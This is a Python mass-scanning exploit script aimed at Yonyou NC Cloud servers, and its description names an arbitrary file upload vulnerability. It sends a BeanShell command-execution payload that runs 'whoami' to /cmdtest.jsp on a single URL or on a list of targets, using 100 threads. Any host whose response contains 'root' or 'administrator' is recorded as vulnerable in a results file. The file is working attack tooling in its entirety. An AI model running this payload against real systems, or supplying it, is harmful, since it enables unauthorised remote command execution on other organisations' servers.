import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test="""
        ██    ██  ██████  ███    ██  ██████  ██    ██  ██████  ██    ██ 
         ██  ██  ██    ██ ████   ██ ██        ██  ██  ██    ██ ██    ██ 
          ████   ██    ██ ██ ██  ██ ██   ███   ████   ██    ██ ██    ██ 
           ██    ██    ██ ██  ██ ██ ██    ██    ██    ██    ██ ██    ██ 
           ██     ██████  ██   ████  ██████     ██     ██████   ██████  
                                                                      
                                                                        author:秋妤
                                                                        date:2024.09.08
                                                                        version:1.0                             

        """
    print(test)

def main():
    banner()
    parser=argparse.ArgumentParser(description='NC Cloud jsinvoke 任意文件上传')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload= "/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime. getRuntime().exec(%22whoami%22).getInputStream()"
    headers={
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    }

    try:
        res1=requests.get(url=target+url_payload,headers=headers,timeout=10)
        if  res1.status_code==200 and ("administrator" in res1.text or "root" in res1.text ):
            print( f"[+]{target} 存在漏洞！")
            with open('用友_result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()